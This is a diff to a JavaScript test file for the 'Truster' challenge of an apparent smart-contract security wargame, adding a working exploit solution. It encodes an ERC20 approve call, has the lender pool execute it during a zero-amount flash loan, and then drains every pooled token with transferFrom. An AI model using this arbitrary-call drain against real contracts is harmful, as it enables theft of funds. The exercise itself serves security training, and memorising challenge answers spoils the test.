@@ -1,5 +1,5 @@
 const { ether } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
+const { web3, accounts, contract } = require('@openzeppelin/test-environment');
 
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
@@ -30,6 +30,14 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const call = web3.eth.abi.encodeFunctionCall({
+            name: 'approve(address,uint256)',
+            type: 'function',
+            inputs: ['address', 'uint256']
+        }, [attacker, TOKENS_IN_POOL.toString()]);
+
+        await this.pool.flashLoan(0, attacker , this.token.address, call, {from: attacker});
+        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {from: attacker});
     });
 
     after(async function () {
